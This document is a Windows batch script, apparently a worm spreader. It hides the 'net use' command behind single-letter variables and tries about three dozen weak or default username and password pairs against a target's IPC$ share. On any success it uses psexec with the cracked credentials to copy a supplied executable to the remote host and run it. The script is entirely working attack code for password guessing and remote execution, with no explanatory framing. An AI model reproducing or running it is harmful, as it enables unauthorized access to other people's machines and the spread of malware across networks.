@echo off
set H=u
set I=s
set L=n
set X=e
set Q=t
set C=e
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "xxyyzz" /user:administrator
if not errorlevel 1 goto b1u3scn29
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "abc" /user:admin
if not errorlevel 1 goto b1u3scn30
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto b1u3scn31
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "teacher" /user:teacher
if not errorlevel 1 goto b1u3scn32
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "" /user:user
if not errorlevel 1 goto b1u3scn33
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "user" /user:user
if not errorlevel 1 goto b1u3scn34
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto b1u3scn4
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto b1u3scn5
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "1" /user:administrator
if not errorlevel 1 goto b1u3scn26
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "123" /user:administrator
if not errorlevel 1 goto b1u3scn27
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "12345" /user:admin
if not errorlevel 1 goto b1u3scn28
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto b1u3scn6
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto b1u3scn35
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "Administrator" /user:administrator
if not errorlevel 1 goto b1u3scn37
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto b1u3scn3
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto b1u3scn7
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto b1u3scn8
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto b1u3scn9
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto b1u3scn12
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto b1u3scn13
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "123456" /user:administrator
if not errorlevel 1 goto b1u3scn14
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "654321" /user:administrator
if not errorlevel 1 goto b1u3scn15
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "abc123" /user:administrator
if not errorlevel 1 goto b1u3scn16
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto b1u3scn36
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "red123" /user:administrator
if not errorlevel 1 goto b1u3scn17
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "admin123" /user:administrator
if not errorlevel 1 goto b1u3scn18
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "qwerty" /user:administrator
if not errorlevel 1 goto b1u3scn19
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "asdf" /user:administrator
if not errorlevel 1 goto b1u3scn20
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "password123" /user:administrator
if not errorlevel 1 goto b1u3scn21
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "secret" /user:administrator
if not errorlevel 1 goto b1u3scn22
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "qwertyuiop" /user:administrator
if not errorlevel 1 goto b1u3scn23
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto b1u3scn24
%L%%X%%Q% %H%%I%%C% \\%1\ipc$ "54321" /user:administrator
if not errorlevel 1 goto b1u3scn25
goto b1u3scnend
:b1u3scn37
psexec \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
psexec \\%1 -u administrator -p "Administrator" -d %2 -o
goto b1u3scnend
:b1u3scn13
psexec \\%1 -u admin -p "admin" -d attrib.exe -r %2
psexec \\%1 -u admin -p "admin" -f -c -d %2 -o
psexec \\%1 -u admin -p "admin" -d %2 -o
goto b1u3scnend
:b1u3scn3
psexec \\%1 -u administrator -p "test" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "test" -f -c -d %2 -o
psexec \\%1 -u administrator -p "test" -d %2 -o
goto b1u3scnend
:b1u3scn4
psexec \\%1 -u test -p "test" -d attrib.exe -r %2
psexec \\%1 -u test -p "test" -f -c -d %2 -o
psexec \\%1 -u test -p "test" -d %2 -o
goto b1u3scnend
:b1u3scn5
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "test123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "test123" -d %2 -o
goto b1u3scnend
:b1u3scn6
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "temp" -f -c -d %2 -o
psexec \\%1 -u administrator -p "temp" -d %2 -o
goto b1u3scnend
:b1u3scn7
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "temp123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "temp123" -d %2 -o
goto b1u3scnend
:b1u3scn8
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "pass" -f -c -d %2 -o
psexec \\%1 -u administrator -p "pass" -d %2 -o
goto b1u3scnend
:b1u3scn9
psexec \\%1 -u administrator -p "password" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "password" -f -c -d %2 -o
psexec \\%1 -u administrator -p "password" -d %2 -o
goto b1u3scnend
:b1u3scn12
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "changeme" -f -c -d %2 -o
psexec \\%1 -u administrator -p "changeme" -d %2 -o
goto b1u3scnend
:b1u3scn14
psexec \\%1 -u administrator -p "123456" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "123456" -f -c -d %2 -o
psexec \\%1 -u administrator -p "123456" -d %2 -o
goto b1u3scnend
:b1u3scn15
psexec \\%1 -u administrator -p "654321" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "654321" -f -c -d %2 -o
psexec \\%1 -u administrator -p "654321" -d %2 -o
goto b1u3scnend
:b1u3scn16
psexec \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "abc123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "abc123" -d %2 -o
goto b1u3scnend
:b1u3scn17
psexec \\%1 -u administrator -p "red123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "red123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "red123" -d %2 -o
goto b1u3scnend
:b1u3scn18
psexec \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "admin123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "admin123" -d %2 -o
goto b1u3scnend
:b1u3scn19
psexec \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
psexec \\%1 -u administrator -p "qwerty" -d %2 -o
goto b1u3scnend
:b1u3scn20
psexec \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "asdf" -f -c -d %2 -o
psexec \\%1 -u administrator -p "asdf" -d %2 -o
goto b1u3scnend
:b1u3scn21
psexec \\%1 -u administrator -p "password123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "password123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "password123" -d %2 -o
goto b1u3scnend
:b1u3scn22
psexec \\%1 -u administrator -p "secret" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "secret" -f -c -d %2 -o
psexec \\%1 -u administrator -p "secret" -d %2 -o
goto b1u3scnend
:b1u3scn23
psexec \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
psexec \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto b1u3scnend
:b1u3scn24
psexec \\%1 -u administrator -p "12345" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "12345" -f -c -d %2 -o
psexec \\%1 -u administrator -p "12345" -d %2 -o
goto b1u3scnend
:b1u3scn25
psexec \\%1 -u administrator -p "54321" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "54321" -f -c -d %2 -o
psexec \\%1 -u administrator -p "54321" -d %2 -o
goto b1u3scnend
:b1u3scn26
psexec \\%1 -u administrator -p "1" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "1" -f -c -d %2 -o
psexec \\%1 -u administrator -p "1" -d %2 -o
goto b1u3scnend
:b1u3scn27
psexec \\%1 -u administrator -p "123" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "123" -f -c -d %2 -o
psexec \\%1 -u administrator -p "123" -d %2 -o
goto b1u3scnend
:b1u3scn28
psexec \\%1 -u admin -p "12345" -d attrib.exe -r %2
psexec \\%1 -u admin -p "12345" -f -c -d %2 -o
psexec \\%1 -u admin -p "12345" -d %2 -o
goto b1u3scnend
:b1u3scn29
psexec \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
psexec \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto b1u3scnend
:b1u3scn30
psexec \\%1 -u admin -p "abc" -d attrib.exe -r %2
psexec \\%1 -u admin -p "abc" -f -c -d %2 -o
psexec \\%1 -u admin -p "abc" -d %2 -o
goto b1u3scnend
:b1u3scn31
psexec \\%1 -u student -p "student" -d attrib.exe -r %2
psexec \\%1 -u student -p "student" -f -c -d %2 -o
psexec \\%1 -u student -p "student" -d %2 -o
goto b1u3scnend
:b1u3scn32
psexec \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
psexec \\%1 -u teacher -p "teacher" -f -c -d %2 -o
psexec \\%1 -u teacher -p "teacher" -d %2 -o
goto b1u3scnend
:b1u3scn33
psexec \\%1 -u user -p "" -d attrib.exe -r %2
psexec \\%1 -u user -p "" -f -c -d %2 -o
psexec \\%1 -u user -p "" -d %2 -o
goto b1u3scnend
:b1u3scn34
psexec \\%1 -u user -p "user" -d attrib.exe -r %2
psexec \\%1 -u user -p "user" -f -c -d %2 -o
psexec \\%1 -u user -p "user" -d %2 -o
goto b1u3scnend
:b1u3scn35
psexec \\%1 -u administrator -p "" -d attrib.exe -r %2
psexec \\%1 -u administrator -p "" -f -c -d %2 -o
psexec \\%1 -u administrator -p "" -d %2 -o
goto b1u3scnend
